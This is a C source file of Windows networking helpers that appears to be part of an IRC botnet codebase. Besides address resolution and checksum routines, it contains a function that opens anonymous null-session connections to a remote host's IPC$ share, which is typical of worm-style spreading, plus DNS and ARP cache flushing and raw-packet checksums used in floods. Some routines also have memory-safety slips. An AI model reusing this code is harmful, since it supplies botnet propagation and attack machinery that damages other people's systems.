#include "includes.h"
#include "functions.h"
#include "externs.h"

bool PrivateIP(const char *ip)
{
	if (strcmp(ip, "") != 0) {
		char ipbuf[16]; strncpy(ipbuf, ip, sizeof(ipbuf)); 
		int ip1 = atoi(strtok(ipbuf, ".")),
			ip2 = atoi(strtok(NULL, "."));

		if ((ip1 == 10)									// 10.0.0.0 - 10.255.255.255
			|| (ip1 == 172 && (ip2 >= 16 && ip2 <= 31))	// 172.16.0.0 - 172.31.255.255
			|| (ip1 == 192 && ip2 == 168))				// 192.168.0.0 - 192.168.255.255
			return true;
	}
	return false;
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		LPHOSTENT pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

bool FlushDNSCache(void)
{
	bool bRet = false;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

bool FlushARPCache(void)
{
    char logbuf[LOGLINE];
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	bool bRet = true;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, true);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		memset((LPVOID)arp, 0, tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, true)) != ERROR_SUCCESS) {
				sprintf(logbuf,"[FLUSHDNS]: Error getting ARP cache: <%d>.",result);
				bRet = false;
			}
		} else {
			sprintf(logbuf,"[FLUSHDNS]: Unable to allocation ARP cache.");
			bRet = false;
		}
		break;
	case ERROR_NO_DATA:
		sprintf(logbuf,"[FLUSHDNS]: ARP cache is empty.");
		bRet = false;
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(logbuf,"[FLUSHDNS]: Not supported by this system.");
		bRet = false;
		break;
	default:
		sprintf(logbuf,"[FLUSHDNS]: Error getting ARP cache: <%d>.",result);
		bRet = false;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	} else
		addlog(logbuf);
	free(arp);

	return (bRet);
}

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}

bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{	
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType       = RESOURCETYPE_ANY;
	nr->lpLocalName  = NULL;
	nr->lpRemoteName = Resource;
	nr->lpProvider   = NULL;
	
	DWORD result = fWNetAddConnection2W(nr, L"", L"", 0);

	if (result == 5 || result == 1219) 
		result = fWNetAddConnection2W(nr, NULL, NULL, 0);
	if (result == 5 || result == 1219) 
		return false;

	return true;
}

bool CloseNullSession(const char *remote_host)
{	
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource, (wchar_t*)szServer);
	wcscat(Resource, Ipc);

	while (fWNetCancelConnection2W(Resource, 0, false) != NO_ERROR) 
		Sleep(2000);

	return true;
}